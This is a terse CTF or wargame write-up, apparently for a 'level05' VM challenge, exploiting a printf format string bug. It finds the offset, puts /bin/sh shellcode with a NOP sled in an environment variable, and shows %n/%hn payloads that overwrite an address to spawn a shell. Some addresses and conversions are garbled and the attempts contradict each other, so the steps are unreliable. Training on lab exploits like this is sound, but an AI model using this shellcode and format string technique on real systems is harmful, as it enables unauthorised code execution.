We get the binary out of the Vm using this cmd:

`scp -P 4242 level05@192.168.56.103:./level05 .binary/level2`

printf exploit, find the offset :\
We know addr of the prnitf format string (our input) is `0x0804846e`

`python -c "print '\x08\x04\x84\x6e'[::-1] + '%p '* 10" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level05`

we got this
```
n0x64 0xf7fcfac0 0xf7ec3af9 0xffffd5ff 0xffffd5fe (nil) 0xffffffff 0xffffd684 0xf7fdb000 0x804846e 
```
so offset is 10

Lets put a shellcode in a env variable
`export SHELLCODE=$(python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")`

We need it's addr so let's use a small c file :
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
	if (argc != 2)
		return (printf("need te env var you want the addr of\n"));
	printf("Var [%s] at addr [%p] = [%s]\n", argv[1], getenv(argv[1]), getenv(argv[1]));
	return 0;
}
```

compile with flag -m32 to get the 32 bit addr


* shellcode addr : `0x  7fffffffe107` => decimal 
						  2 147 483 647       57607
* addr of exit   : `0xf7e5eb70`


`addr exit` + `%c` + `%10$n`

`python -c "print '\x38\x98\x04\x08' + '%2048x%4\$hn' + '%31904x%4\$hn'" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level5`

python -c "print '\x08\x04\x97\xe0'[::-1] + '%57603c' + '%11\$c' + '%2147426040c' + '%10\$n'"> /tmp/exploit_5; cat /tmp/exploit_5 | ./level05